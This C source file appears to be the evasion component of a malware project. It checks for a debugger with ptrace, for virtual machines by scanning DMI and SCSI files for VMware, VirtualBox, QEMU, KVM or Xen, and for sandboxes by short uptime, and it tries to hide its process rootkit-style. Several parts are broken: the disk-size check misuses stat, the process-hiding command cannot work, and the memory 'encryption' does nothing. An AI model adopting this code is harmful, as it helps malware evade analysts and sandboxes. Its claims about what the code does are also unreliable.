#include "evasion.h"
#include "config.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <fcntl.h>

int check_debugger() {
    // Check for debugger presence using ptrace
    if (ptrace(PTRACE_TRACEME, 0, 1, 0) == -1) {
        return 1; // Debugger detected
    }
    return 0;
}

int check_vm() {
    // Check for VM-specific files
    const char* vm_files[] = {
        "/proc/scsi/scsi",
        "/sys/class/dmi/id/product_name",
        "/sys/class/dmi/id/sys_vendor",
        NULL
    };

    for (int i = 0; vm_files[i]; i++) {
        FILE* file = fopen(vm_files[i], "r");
        if (file) {
            char buffer[256];
            while (fgets(buffer, sizeof(buffer), file)) {
                if (strstr(buffer, "VMware") || strstr(buffer, "VirtualBox") || 
                    strstr(buffer, "QEMU") || strstr(buffer, "KVM") ||
                    strstr(buffer, "Xen")) {
                    fclose(file);
                    return 1; // VM detected
                }
            }
            fclose(file);
        }
    }
    return 0;
}

int check_sandbox() {
    // Check for sandbox-specific indicators
    struct stat st;
    
    // Check for short uptime
    FILE* uptime_file = fopen("/proc/uptime", "r");
    if (uptime_file) {
        double uptime;
        fscanf(uptime_file, "%lf", &uptime);
        fclose(uptime_file);
        if (uptime < 300) { // Less than 5 minutes
            return 1; // Sandbox detected
        }
    }

    // Check for limited disk space
    if (stat("/", &st) == 0) {
        if (st.st_size < 1024 * 1024 * 1024) { // Less than 1GB
            return 1; // Sandbox detected
        }
    }

    return 0;
}

void hide_process() {
    // Hide process from /proc
    // This is a simple example, real rootkits use more advanced techniques
    char cmd[256];
    snprintf(cmd, sizeof(cmd), "echo 0 > /proc/%d/stat", getpid());
    system(cmd);
}

void encrypt_memory() {
    // Simple memory encryption example
    // Real implementations use more advanced techniques
    char* data = malloc(1024);
    if (data) {
        memset(data, 0xAA, 1024);
        // Encrypt data here
        free(data);
    }
}